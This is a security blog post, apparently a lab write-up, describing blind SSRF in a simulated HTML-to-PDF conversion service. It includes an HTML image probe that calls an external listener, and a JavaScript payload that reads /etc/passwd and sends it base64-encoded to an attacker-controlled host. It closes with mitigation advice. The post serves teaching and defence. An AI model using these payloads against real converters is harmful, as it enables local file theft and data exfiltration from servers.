---
title: "Exploring Blind SSRF Vulnerabilities in HTML to PDF Conversion Applications"
date: 2023-04-23
author: 0xLuc4s
categories: [ssrf-vulnerabilies]
tags: [ssrf]
---

## Overview

This post delves into a case study of a blind Server-Side Request Forgery (SSRF) vulnerability within a fictitious application designed for converting HTML documents to PDFs. The application, which is a simulated target in a controlled environment, highlights the subtlety and potential impact of SSRF vulnerabilities, especially when they do not provide direct feedback or error messages.

## Testing Environment and Setup

The target application listens on port 8080 and accepts HTML files for processing into PDF documents. Initial observations indicated that the server's response was identical regardless of the HTML content provided, suggesting no visible data processing errors or SSRF indications through the front-end.

## Conducting Blind SSRF Tests

To test for blind SSRF, we employed an external server setup to capture any outbound requests from the application. The test involved submitting an HTML file containing a reference to an image hosted on our external server:

```html
<!DOCTYPE html>
<html>
<body>
    <h1>Hello World!</h1>
    <img src="http://<EXTERNAL SERVICE IP>:9090/test-image">
</body>
</html>

## Observations and Results

Upon processing the HTML file, the application attempted to fetch the image from the specified URL, thus confirming the SSRF vulnerability. This behavior was indicative of the application performing unauthorized external interactions based on HTML content, a critical aspect for SSRF exploitation.

## JavaScript Exploitation and Data Exfiltration

Further exploration revealed that the application's PDF conversion tool allowed JavaScript execution within the HTML files. Leveraging this, we crafted a JavaScript snippet to read a sensitive local file and send its contents to our external server:

```html
<html>
<body>
    <script>
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "file:///etc/passwd", true);
    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4 && xhr.status === 200) {
            // Encode the file contents in base64
            var b64content = btoa(xhr.responseText);
            // Send the encoded data to the external server
            var exfil = new XMLHttpRequest();
            exfil.open("GET", "http://<EXTERNAL SERVICE IP>:9090/exfil?data=" + b64content, true);
            exfil.send();
        }
    };
    xhr.send();
    </script>
</body>
</html>

## Mitigation Strategies

To mitigate blind SSRF vulnerabilities, it is essential to:

- **Validate and sanitize all incoming data**, especially URLs and file paths, to prevent external resource references.
- **Implement strict allowlists** for outbound connections and protocols that the server can access.
- **Use secure programming practices** to disable unnecessary HTTP features that could be exploited via SSRF.
- **Regularly update and patch** third-party libraries and tools used for processing user-supplied content.

## Conclusion

Blind SSRF poses significant security risks, particularly in applications that process external input to interact with internal or external resources. Understanding and mitigating these vulnerabilities is crucial for securing web applications against potential attacks and data breaches. These strategies not only protect against SSRF but also reinforce the overall security posture of your digital infrastructure.
